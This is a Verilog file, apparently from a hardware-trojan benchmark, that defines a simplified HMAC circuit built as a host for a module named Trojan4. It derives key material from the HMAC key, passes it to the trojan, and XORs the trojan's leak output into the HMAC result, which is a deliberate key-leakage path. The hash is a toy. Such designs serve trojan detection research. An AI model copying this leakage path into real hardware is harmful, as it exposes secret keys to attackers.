// HMAC Host Circuit for Trojan4
// Fixed I/O to match Trojan4: clk, rst, key[63:0] -> leak[63:0]
module trojan4_hmac_host #(
    parameter HASH_WIDTH = 16,    // Reduced hash output width
    parameter KEY_WIDTH = 32,     // Reduced HMAC key width
    parameter MSG_WIDTH = 64,     // Reduced message width
    parameter [511:0] OPAD_INIT = 512'h5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C
)(
    input wire clk,
    input wire rst,
    input wire [MSG_WIDTH-1:0] message,
    input wire [KEY_WIDTH-1:0] hmac_key,
    input wire hmac_start,
    output reg [HASH_WIDTH-1:0] hmac_out,
    output reg hmac_valid
);

    // Trojan interface (fixed width)
    wire [63:0] trojan_key;
    wire [63:0] trojan_leak;
    
    // HMAC computation state
    reg [KEY_WIDTH-1:0] ipad_key, opad_key;
    reg [HASH_WIDTH-1:0] inner_hash, outer_hash;
    reg [MSG_WIDTH+KEY_WIDTH-1:0] inner_msg, outer_msg;
    reg [2:0] hmac_state;
    reg [7:0] hash_counter;
    
    // Key derivation for trojan
    reg [511:0] pad_state;
    reg [63:0] key_material;
    reg [7:0] hmac_round_counter;
    
    // Generate key material from HMAC operations
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pad_state <= OPAD_INIT;
            key_material <= 64'h0;
            hmac_round_counter <= 8'h0;
        end else if (hmac_start || (hmac_state != 3'b000)) begin
            pad_state <= {pad_state[510:0], pad_state[511] ^ pad_state[383] ^ pad_state[255] ^ pad_state[127]};
            key_material <= {{(64-KEY_WIDTH){1'b0}}, hmac_key} ^ pad_state[63:0];
            hmac_round_counter <= hmac_round_counter + 1;
        end
    end
    
    assign trojan_key = key_material;
    
    // Simple hash function (for inner and outer hash)
    function [HASH_WIDTH-1:0] simple_hash;
        input [MSG_WIDTH+KEY_WIDTH-1:0] data;
        reg [HASH_WIDTH-1:0] h0, h1, h2, h3;
        reg [31:0] chunk;
        integer i;
        begin
            h0 = 16'h6745;
            h1 = 16'hEFCD;
            h2 = 16'h98BA;
            h3 = 16'h1032;
            
            for (i = 0; i < (MSG_WIDTH+KEY_WIDTH)/32; i = i + 1) begin
                chunk = data[i*32 +: 32];
                h0 = h0 + chunk[HASH_WIDTH-1:0];
                h1 = h1 ^ chunk[HASH_WIDTH-1:0];
                h2 = h2 + chunk[HASH_WIDTH-1:0];
                h3 = h3 ^ chunk[HASH_WIDTH-1:0];
            end
            
            simple_hash = h0[HASH_WIDTH-1:0] ^ h1[HASH_WIDTH-1:0] ^ 
                         h2[HASH_WIDTH-1:0] ^ h3[HASH_WIDTH-1:0];
        end
    endfunction
    
    // HMAC computation state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            ipad_key <= {KEY_WIDTH{1'b0}};
            opad_key <= {KEY_WIDTH{1'b0}};
            inner_hash <= {HASH_WIDTH{1'b0}};
            outer_hash <= {HASH_WIDTH{1'b0}};
            inner_msg <= {(MSG_WIDTH+KEY_WIDTH){1'b0}};
            outer_msg <= {(MSG_WIDTH+KEY_WIDTH){1'b0}};
            hmac_state <= 3'b000;
            hash_counter <= 8'h0;
            hmac_valid <= 1'b0;
        end else begin
            case (hmac_state)
                3'b000: begin // IDLE
                    hmac_valid <= 1'b0;
                    if (hmac_start) begin
                        // Prepare IPAD and OPAD keys
                        ipad_key <= hmac_key ^ {{(KEY_WIDTH/8){8'h36}}};
                        opad_key <= hmac_key ^ {{(KEY_WIDTH/8){8'h5C}}};
                        hmac_state <= 3'b001;
                        hash_counter <= 8'h0;
                    end
                end
                3'b001: begin // INNER_HASH_PREP
                    inner_msg <= {ipad_key, message};
                    hmac_state <= 3'b010;
                end
                3'b010: begin // INNER_HASH_COMPUTE
                    inner_hash <= simple_hash(inner_msg);
                    hmac_state <= 3'b011;
                    hash_counter <= hash_counter + 1;
                end
                3'b011: begin // OUTER_HASH_PREP
                    outer_msg <= {opad_key, {{(MSG_WIDTH-HASH_WIDTH){1'b0}}, inner_hash}};
                    hmac_state <= 3'b100;
                end
                3'b100: begin // OUTER_HASH_COMPUTE
                    outer_hash <= simple_hash(outer_msg);
                    hmac_state <= 3'b101;
                    hash_counter <= hash_counter + 1;
                end
                3'b101: begin // DONE
                    hmac_valid <= 1'b1;
                    hmac_state <= 3'b000;
                end
                default: hmac_state <= 3'b000;
            endcase
        end
    end
    
    // Output with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst)
            hmac_out <= {HASH_WIDTH{1'b0}};
        else if (hmac_valid) begin
            // Mix HMAC result with trojan leak
            hmac_out <= outer_hash ^ trojan_leak[HASH_WIDTH-1:0];
        end
    end
    
    // Instantiate Trojan4
    Trojan4 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule
